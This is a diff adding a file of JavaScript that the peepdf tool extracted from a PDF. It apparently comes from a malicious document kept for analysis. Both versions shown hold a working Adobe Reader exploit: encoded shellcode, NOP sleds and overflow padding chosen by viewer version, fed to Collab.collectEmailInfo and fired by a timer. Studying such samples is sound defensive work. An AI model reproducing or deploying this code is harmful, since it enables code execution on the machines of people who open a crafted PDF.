@@ -1,0 +1,58 @@
+// peepdf comment: Javascript code located in object 30 (version 1)
+
+function re(count, what) {
+    var v = "";
+    while (--count >= 0)
+    v += what;
+    return v;
+}
+
+function start() {
+    sc = unescape("%uc933%ub966%u018c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f63%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6159%u6d64%u6f61%u6667%u6668%u6a60%u6265%u6159%u6d64%u6f61%u7067%u6668%u6360%u6265%u6159%u6d64%u6f61%u6767%u6668%u6c5f%u6265%u6159%u6d64%u6f61%u6b61%u6668%u655f%u6265%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5d%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");
+    if (app.viewerVersion >= 7.0) {
+        plin = re(1124, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u9090%u9090") + re(120, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u9090%u9090") + sc + re(1256, unescape("%u4141%u4141"));
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = re(80, unescape("%u9090%u9090")) + sc + re(80, unescape("%u9090%u9090")) + unescape("%u17e9%ufffb") + unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+        plin += re(2626, ef6);
+    }
+    if (app.viewerVersion >= 6.0) {
+        this.collabStore = Collab.collectEmailInfo({
+            subj: "",
+            msg: plin
+        });
+    }
+}
+var shaft = app.setTimeOut("start()", 1200);
+
+// peepdf comment: Javascript code located in object 30 (version 3)
+
+function re(count, what) {
+    var v = "";
+    while (--count >= 0)
+    v += what;
+    return v;
+}
+
+function start() {
+    sc = unescape("%uc933%ub966%u018c%u1beb%u565e%ufe8b%u66ac%u612d%u6600%ue0c1%u6604%ud08b%u2cac%u6661%uc203%u49aa%uea75%ue8c3%uffe0%uffff%u6666%u6c59%u6d5f%u6459%u6d5f%u6d66%u6466%u6766%u6866%u685d%u6665%u6160%u6262%u6161%u6161%u6161%u6a5f%u6f63%u6261%u6161%u6161%u7059%u6665%u6d60%u6567%u625b%u6164%u6161%u6161%u6161%u6c59%u6165%u6d61%u6c59%u6168%u6d62%u6e5b%u6c59%u6966%u6961%u6a59%u6e66%u6d5f%u6c59%u6e65%u6160%u6c59%u6e68%u6d60%u6266%u6c59%u6665%u6d5f%u6c59%u6168%u6d64%u6c59%u6568%u6761%u6968%u6461%u6160%u6766%u6c59%u6768%u6163%u6461%u6160%u6464%u6a5d%u6a65%u6265%u6e5b%u6461%u6665%u6d5f%u6464%u6c5e%u7061%u6f5c%u6162%u6b64%u675e%u6568%u6961%u625d%u6c5d%u6e61%u6461%u6b5e%u6165%u6c5f%u6260%u6c64%u7062%u6668%u675f%u6f66%u6c59%u6f66%u6563%u6461%u6e66%u6d5f%u6767%u6c59%u6d61%u6c65%u6c59%u6f66%u6d62%u6461%u6e66%u6d5f%u6c59%u6561%u6c59%u6461%u6665%u6d5f%u6c5b%u6a66%u635f%u665c%u6464%u615d%u6a59%u6665%u695f%u6a59%u6665%u655f%u6459%u6665%u655f%u6561%u6b67%u6161%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6162%u6a59%u6665%u6560%u6459%u6e68%u6560%u7060%u6568%u6e67%u6259%u6e68%u6560%u6161%u6163%u6161%u6161%u6e68%u6361%u6c5f%u6367%u6b67%u6165%u6967%u6161%u6162%u6161%u6161%u6c59%u6666%u6560%u6366%u6b67%u6161%u6c59%u6665%u6d60%u7060%u6166%u6564%u6a59%u6665%u6960%u6b67%u6161%u6b67%u6161%u6b67%u6161%u6c59%u6e65%u655f%u6266%u6c59%u6666%u6d60%u7060%u6366%u6164%u6b67%u6161%u6e59%u6665%u695f%u6166%u6c59%u6e65%u6560%u6266%u6c59%u6666%u6960%u6366%u6c59%u6665%u655f%u6166%u6c59%u6e65%u6d60%u7060%u6266%u6d63%u6c59%u6666%u6960%u6461%u6666%u6560%u6259%u6b68%u6d60%u6667%u7067%u6767%u6b61%u6668%u6361%u6c5f%u6163%u6967%u6161%u6159%u6161%u6161%u6c59%u6665%u6560%u6166%u6c59%u6e65%u6960%u6266%u6c59%u6666%u6d60%u7060%u6366%u6964%u695c%u6261%u6161%u6161%u6161%u6659%u615d%u7061%u6659%u6e67%u7060%u7060%u7060%u6c59%u6668%u6960%u6464%u6a5d%u6265%u6159%u6d64%u6f61%u6667%u6668%u6a60%u6265%u6159%u6d64%u6f61%u7067%u6668%u6360%u6265%u6159%u6d64%u6f61%u6767%u6668%u6c5f%u6265%u6159%u6d64%u6f61%u6b61%u6668%u655f%u6265%u6461%u6260%u7060%u6668%u6d60%u7060%u6668%u655f%u7060%u675e%u695f%u6e5d%u6f60%u7060%u7060%u6c60%u685a%u6e60%u7061%u665b%u6862%u6161%u6d68%u6368%u6f60%u645c%u6762%u6f68%u695e%u635f%u6468%u6e5b%u6c5a%u6e68%u705e%u6768%u6e67%u615c%u6665%u6964%u6363%u6d5b%u685f%u6464%u6b5d%u6b59%u6c66%u6f59%u6f65%u6f61%u6d5f%u6b60%u685a%u6361%u6d65%u6760%u6b5f%u6b5c%u6d66%u6762%u6667%u6b60%u6162%u6d5b%u6961%u6b5e%u6768%u6566%u6b5d%u705b%u625a%u6d5b%u6464%u6761%u6461%u695a%u6f60%u6b59%u6f61%u7062%u6a68%u6b61%u695f");
+    if (app.viewerVersion >= 7.0) {
+        plin = re(1124, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u9090%u9090") + re(120, unescape("%u0b0b%u0028%u06eb%u06eb")) + unescape("%u9090%u9090") + sc + re(1256, unescape("%u4141%u4141"));
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = re(80, unescape("%u9090%u9090")) + sc + re(80, unescape("%u9090%u9090")) + unescape("%u17e9%ufffb") + unescape("%uffff%uffff") + unescape("%uf6eb%uf4eb") + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+        plin += re(2626, ef6);
+    }
+    if (app.viewerVersion >= 6.0) {
+        this.collabStore = Collab.collectEmailInfo({
+            subj: "",
+            msg: plin
+        });
+    }
+}
+var shaft = app.setTimeOut("start()", 1200);
+
